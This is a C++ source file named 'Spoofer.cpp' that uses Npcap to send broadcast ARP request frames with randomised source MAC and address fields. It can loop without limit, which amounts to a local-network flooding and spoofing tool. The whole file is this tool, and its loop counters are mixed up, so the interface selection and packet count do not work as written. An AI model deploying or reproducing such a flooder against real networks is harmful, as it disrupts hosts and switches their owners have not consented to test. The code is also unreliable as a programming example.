// Spoofer.cpp : Этот файл содержит функцию "main". Здесь начинается и заканчивается выполнение программы.
//

#include <stdlib.h>
#include <stdio.h>
#include <string>
#include <random>
#include <ctime>

#include <pcap.h>

#include <iostream>

#ifdef WIN32
#include <tchar.h>
BOOL LoadNpcapDlls()
{
	_TCHAR npcap_dir[512];
	UINT len;
	len = GetSystemDirectory(npcap_dir, 480);
	if (!len) {
		fprintf(stderr, "Error in GetSystemDirectory: %x", GetLastError());
		return FALSE;
	}
	_tcscat_s(npcap_dir, 512, _T("\\Npcap"));
	if (SetDllDirectory(npcap_dir) == 0) {
		fprintf(stderr, "Error in SetDllDirectory: %x", GetLastError());
		return FALSE;
	}
	return TRUE;
}
#endif

int main()
{
	srand(time(nullptr));

#ifdef WIN32
	// Load Npcap and its functions.
	if (!LoadNpcapDlls())
	{
		fprintf(stderr, "Couldn't load Npcap\n");
		exit(1);
	}
#endif

	pcap_if_t* alldevs;
	pcap_if_t* d;
	int i = 0;
	char errbuf[PCAP_ERRBUF_SIZE];

	/* Retrieve the device list from the local machine */
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL /* auth is not needed */, &alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs_ex: %s\n", errbuf);
		exit(1);
	}

	/* Print the list */
	for (d = alldevs; d != NULL; d = d->next)
	{
		printf("%d. %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}

	if (i == 0)
	{
		printf("\nNo interfaces found! Make sure Npcap is installed.\n");
		return 0;
	}

	int iface_num;
	int di = 1;
	pcap_t* fp;

	std::cout << "Select interface number: ";
	std::cin >> iface_num;

	// Open the adapter
	for (d = alldevs; d != NULL && di < iface_num; d = d->next, i++)
		;
	if (d == NULL)
	{
		fprintf(stderr, "\nWrong number!\n");
		return 3;
	}

	if ((fp = pcap_open_live(d->name,		// name of the device
		65536,			// portion of the packet to capture. It doesn't matter in this case 
		1,				// promiscuous mode (nonzero means promiscuous)
		1000,			// read timeout
		errbuf			// error buffer
	)) == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by Npcap\n", d->name);
		return 2;
	}

	std::cout << "Select packet count (0 - inf): ";
	int count;
	std::cin >> count;
	for (int ic = 0; i < count || count == 0; i++) {
		u_char packet[42];

		// DST address: Broadcast
		for (int pi = 0; pi < 6; ++pi)
			packet[pi] = 0xFF;

		// SRC address: rand
		for (int pi = 6; pi < 12; ++pi)
			packet[pi] = rand();

		//ARP
		packet[12] = 0x08;
		packet[13] = 0x06;

		//Ethernet
		packet[14] = 0x00;
		packet[15] = 0x01;

		//IPv4
		packet[16] = 0x08;
		packet[17] = 0x00;

		//Sizes
		packet[18] = 0x06;
		packet[19] = 0x04;

		//Opcode: ask
		packet[20] = 0x00;
		packet[21] = 0x01;

		//addresses - rand
		for (int pi = 22; pi < 42; ++pi)
			packet[pi] = rand();

		for (int pi = 32; pi < 38; ++pi)
			packet[pi] = 0x00;

		// Send down the packet 
		if (pcap_sendpacket(fp,	// Adapter
			packet,				// buffer with the packet
			42					// size
		) != 0)
		{
			fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(fp));
			return 3;
		}
	}

	/* We don't need any more the device list. Free it */
	pcap_freealldevs(alldevs);

	pcap_close(fp);
	return 0;
}
